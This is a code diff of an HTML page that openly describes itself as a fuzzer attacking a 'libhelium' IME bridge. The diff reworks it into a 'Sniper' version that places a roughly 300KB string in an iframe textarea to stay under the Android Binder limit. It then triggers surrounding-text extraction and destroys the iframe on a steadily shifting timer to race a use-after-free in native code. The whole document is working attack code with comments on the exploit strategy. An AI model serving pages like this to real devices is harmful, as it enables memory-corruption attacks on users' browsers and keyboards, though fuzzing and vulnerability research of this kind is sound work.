@@ -2,18 +2,24 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>IME Precision Fuzzer</title>
+    <title>IME Sniper Fuzzer</title>
 </head>
-<body style="background:#000; color:#f00; font-family:monospace;">
-    <h3>Attacking libhelium IME Bridge (300KB)...</h3>
+<body style="background:#000; color:#0f0; font-family:monospace;">
+    <h3>Executing Single-Shot IME Race Condition...</h3>
     
     <div id="container"></div>
 
     <script>
         const container = document.getElementById('container');
         
-        function triggerUAF() {
-            // 1. Isolate the attack in an iframe so we can destroy it
+        // The Goldilocks string: ~300KB to bypass the 1MB Binder limit
+        const giantText = "A".repeat(150000) + " PWNED " + "B".repeat(150000);
+        
+        // We test different teardown timings to catch the exact moment the C++ pointer is used
+        let teardownDelay = 5; 
+
+        function fireSniper() {
+            // 1. Isolate in an IFrame
             let iframe = document.createElement('iframe');
             iframe.style.width = '100%';
             iframe.style.height = '300px';
@@ -21,34 +27,34 @@
             
             let idoc = iframe.contentDocument;
             
-            // 2. The 300KB String (Bypasses the 1MB Android Binder Limit)
+            // 2. Inject the payload
             let box = idoc.createElement('textarea');
             box.style.width = '100%';
             box.style.height = '100%';
-            box.value = "A".repeat(150000) + " PWNED " + "B".repeat(150000);
+            box.value = giantText;
             idoc.body.appendChild(box);
 
-            // 3. Force Keyboard interaction
+            // 3. Wake up the keyboard and native IME bridge
             box.focus();
 
-            // 4. Thrash the C++ onSurroundingTextReceived function
-            let thrashInterval = setInterval(() => {
-                try {
-                    let pos = Math.floor(Math.random() * 290000);
-                    box.setSelectionRange(pos, pos + 50);
-                } catch(e) {}
-            }, 5); // 5ms delay = massive IPC queue buildup
+            // 4. Trigger ONE massive surrounding text extraction
+            let pos = Math.floor(Math.random() * 290000);
+            box.setSelectionRange(pos, pos + 50);
 
-            // 5. The UAF Guillotine
-            // We destroy the iframe while libhelium is actively reading the text buffer
+            // 5. The Sniper Teardown
+            // Destroy the C++ RenderFrameHost *exactly* as the text extraction is routed
             setTimeout(() => {
-                clearInterval(thrashInterval);
                 container.innerHTML = ''; 
-            }, 800);
+                
+                // Increment delay slightly for the next shot to sweep the race window
+                teardownDelay += 5;
+                if (teardownDelay > 100) teardownDelay = 5;
+                
+            }, teardownDelay);
         }
 
-        // Loop the entire attack sequence
-        setInterval(triggerUAF, 1500);
+        // Fire one precise shot every 1.5 seconds. No spamming.
+        setInterval(fireSniper, 1500);
 
     </script>
 </body>
